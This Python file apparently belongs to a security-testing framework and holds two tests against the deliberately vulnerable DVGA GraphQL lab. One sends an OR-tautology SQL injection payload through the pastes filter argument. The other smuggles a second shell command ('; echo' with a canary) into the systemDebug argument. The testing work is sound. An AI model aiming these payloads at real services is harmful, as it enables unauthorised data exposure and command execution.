"""
GraphQL Injection tests (DVGA).

`PastesFilterSQLiTest` targets the `pastes(filter: String)` argument, which
is concatenated unsanitised into a raw SQLAlchemy `text()` fragment.
`SystemDebugCommandInjectionTest` targets the `systemDebug(arg: String)`
argument, which is passed unsanitised into a shell command. Both run
independently of DVGA's difficulty mode — neither the depth, cost,
introspection, nor operation-name middleware inspects field arguments, so
these findings hold in both easy and hard mode.
"""

from __future__ import annotations

import logging
import uuid
from typing import Any, Optional

import requests

from src.utils.dvga_client import DVGAClient
from src.utils.results_logger import RunLogger
from src.vulnerabilities.base import (
    AssertionRole,
    Severity,
    VulnerabilityResult,
    VulnerabilityTest,
)

logger = logging.getLogger(__name__)


def _parse_json(resp: requests.Response) -> Optional[dict[str, Any]]:
    try:
        return resp.json()
    except ValueError:
        return None


class PastesFilterSQLiTest(VulnerabilityTest):
    """
    Confirms SQL injection in DVGA's `pastes(filter: String)` argument.

    `resolve_pastes` builds `title = '<filter>' or content = '<filter>'` as
    a raw, unparenthesised SQL fragment and appends it to a query already
    scoped by `.filter_by(public=public, burn=False)`. Because the fragment
    is not wrapped in parentheses, an OR tautology in `filter` outranks the
    surrounding `public`/`burn` scoping by SQL operator precedence, so a
    request for `public: true` returns private pastes too.
    """

    name = "pastes_filter_sqli"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: DVGAClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.payload_template = client.scan_config.get(
            "pastes_filter_injection", {}
        ).get("tautology_payload_template", "{canary}' OR '1'='1")

    def run(self) -> list[VulnerabilityResult]:
        canary_title = self._setup_private_canary_paste()
        if canary_title is None:
            return [
                # Setup-failure fallback, not a security-behavior baseline — tagged
                # CONTROL since it is not a detection either way.
                self._result(
                    passed=True,
                    severity=Severity.LOW,
                    evidence=(
                        "Setup (create a private canary paste via createPaste) failed "
                        "— inconclusive, not itself a finding."
                    ),
                    request_summary="mutation createPaste (setup phase)",
                    response_summary="setup failed",
                    assertion_role=AssertionRole.CONTROL,
                )
            ]

        return [
            self._test_control_literal_filter_excludes_private(canary_title),
            self._test_tautology_bypasses_public_scope(canary_title),
        ]

    def _setup_private_canary_paste(self) -> Optional[str]:
        """Create a private paste whose title cannot be guessed, so a later leak is unambiguous."""
        canary_title = f"sqli_canary_{uuid.uuid4().hex[:12]}"
        try:
            resp = self.client.create_paste(
                title=canary_title,
                content="pastes filter SQLi canary",
                public=False,
            )
        except requests.exceptions.RequestException as exc:
            logger.warning("createPaste setup failed at the transport level: %s", exc)
            return None

        data = _parse_json(resp) or {}
        if resp.status_code != 200 or data.get("errors"):
            return None
        paste = data.get("data", {}).get("createPaste", {}).get("paste")
        return canary_title if paste else None

    def _test_control_literal_filter_excludes_private(
        self, canary_title: str
    ) -> VulnerabilityResult:
        """Baseline: a literal, non-matching filter must not surface the private canary paste."""
        control_filter = f"nonexistent_{uuid.uuid4().hex[:10]}"
        resp = self.client.pastes(public=True, filter=control_filter)
        data = _parse_json(resp) or {}
        titles = [p.get("title") for p in (data.get("data") or {}).get("pastes") or []]

        leaked = canary_title in titles
        return self._result(
            passed=not leaked,
            severity=Severity.MEDIUM if leaked else Severity.LOW,
            evidence=(
                f"pastes(public=true, filter={control_filter!r}) -> HTTP {resp.status_code}. "
                f"{'Private canary paste unexpectedly returned — baseline unreliable' if leaked else 'Private canary paste correctly excluded, as expected'}."
            ),
            request_summary=f"query pastes(public=true, filter={control_filter!r})",
            response_summary=f"HTTP {resp.status_code}; titles={titles!r}",
            assertion_role=AssertionRole.CONTROL,
        )

    def _test_tautology_bypasses_public_scope(
        self, canary_title: str
    ) -> VulnerabilityResult:
        """Bypass: an OR tautology in `filter` surfaces a private paste through a public-only query."""
        nonmatching_token = f"nonexistent_{uuid.uuid4().hex[:10]}"
        payload = self.payload_template.format(canary=nonmatching_token)
        resp = self.client.pastes(public=True, filter=payload)
        data = _parse_json(resp) or {}
        titles = [p.get("title") for p in (data.get("data") or {}).get("pastes") or []]

        confirmed = resp.status_code == 200 and canary_title in titles

        evidence = (
            f"pastes(public=true, filter={payload!r}) -> HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                f" Private canary paste {canary_title!r} was returned despite requesting "
                "public=true and the filter value never literally matching its title or "
                "content — the filter argument is concatenated unsanitised into a raw SQL "
                "text() fragment with no parenthesisation, so the OR tautology outranks "
                "the surrounding public/burn filter_by() scoping by operator precedence, "
                "exposing every paste in the table regardless of its public flag. Confirms "
                "SQL injection (CWE-89) with no authentication required."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"query pastes(public=true, filter={payload!r})",
            response_summary=f"HTTP {resp.status_code}; titles={titles!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )


class SystemDebugCommandInjectionTest(VulnerabilityTest):
    """
    Confirms OS command injection in DVGA's `systemDebug(arg: String)` argument.

    `resolve_system_debug` passes `arg` directly into
    `os.popen('ps {}'.format(arg)).read()` with no sanitisation, unlike
    `systemDiagnostics` (gated behind admin credential validation) or
    `importPaste` (its host/path are stripped of `;`/`&` in hard mode).
    `systemDebug` has neither control, in either difficulty mode.
    """

    name = "system_debug_command_injection"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: DVGAClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.payload_template = client.scan_config.get(
            "system_debug_injection", {}
        ).get("command_payload_template", "; echo {canary}")

    def run(self) -> list[VulnerabilityResult]:
        return [
            self._test_control_benign_arg(),
            self._test_command_injection(),
        ]

    def _test_control_benign_arg(self) -> VulnerabilityResult:
        """Baseline: a benign argument must run cleanly with no injected commands."""
        resp = self.client.system_debug(arg="aux")
        data = _parse_json(resp) or {}
        output = data.get("data", {}).get("systemDebug")

        clean = resp.status_code == 200 and bool(output) and not data.get("errors")
        return self._result(
            passed=clean,
            severity=Severity.LOW,
            evidence=(
                f"systemDebug(arg='aux') -> HTTP {resp.status_code} "
                f"({'ran cleanly, as expected' if clean else 'unexpected error — baseline unreliable'})."
            ),
            request_summary="query systemDebug(arg='aux')",
            response_summary=f"HTTP {resp.status_code}",
            assertion_role=AssertionRole.CONTROL,
        )

    def _test_command_injection(self) -> VulnerabilityResult:
        """Bypass: a shell metacharacter in `arg` appends an arbitrary second command."""
        canary = f"cmdicanary{uuid.uuid4().hex[:12]}"
        payload = self.payload_template.format(canary=canary)
        resp = self.client.system_debug(arg=payload)
        data = _parse_json(resp) or {}
        output = data.get("data", {}).get("systemDebug") or ""

        confirmed = resp.status_code == 200 and canary in output

        evidence = f"systemDebug(arg={payload!r}) -> HTTP {resp.status_code}."
        if confirmed:
            evidence += (
                f" Random per-run canary {canary!r} was echoed back in the response, "
                "confirming arbitrary OS command execution — arg is passed directly "
                "into os.popen('ps {}'.format(arg)) with no sanitisation in either "
                "difficulty mode. Confirms OS command injection (CWE-78) with no "
                "authentication required."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"query systemDebug(arg={payload!r})",
            response_summary=f"HTTP {resp.status_code}; output={output!r}",
            payload=payload,
            cwe="CWE-78",
            owasp_top10_web="A03:2021 Injection",
        )


def _print_results(results: list[VulnerabilityResult]) -> None:
    for result in results:
        status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
        print(f"[{status}] {result.test_name} - {result.owasp_category}")
        print(f"  Evidence:  {result.evidence}")
        print(f"  Request:   {result.request_summary}")
        print(f"  Response:  {result.response_summary}")
        print()


def _wait_for_dvga(
    client: DVGAClient, timeout: float = 30.0, interval: float = 2.0
) -> None:
    """
    Poll the container until it accepts connections.
    """
    import time

    deadline = time.monotonic() + timeout
    last_error: Optional[Exception] = None
    while time.monotonic() < deadline:
        try:
            client.get("/")
            return
        except requests.exceptions.RequestException as exc:
            last_error = exc
            time.sleep(interval)
    raise RuntimeError(f"DVGA did not become reachable within {timeout}s: {last_error}")


def _run_dvga() -> None:
    dvga_client = DVGAClient.from_config("config/dvga.yaml")
    _wait_for_dvga(dvga_client)
    dvga_client.set_difficulty("easy")

    with RunLogger("graphql", "dvga", "config/dvga.yaml") as run:
        pastes_sqli_results = PastesFilterSQLiTest(
            architecture="graphql", target="dvga", client=dvga_client
        ).run()
        run.log_results(pastes_sqli_results)
        system_debug_results = SystemDebugCommandInjectionTest(
            architecture="graphql", target="dvga", client=dvga_client
        ).run()
        run.log_results(system_debug_results)

    _print_results(pastes_sqli_results)
    _print_results(system_debug_results)


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--target",
        choices=["dvga"],
        default="dvga",
        help=(
            "Which target's container must be up. DVGA is currently this "
            "framework's only GraphQL target — requires "
            "docker-compose.dvga.yml to be running."
        ),
    )
    args = parser.parse_args()

    if args.target == "dvga":
        _run_dvga()
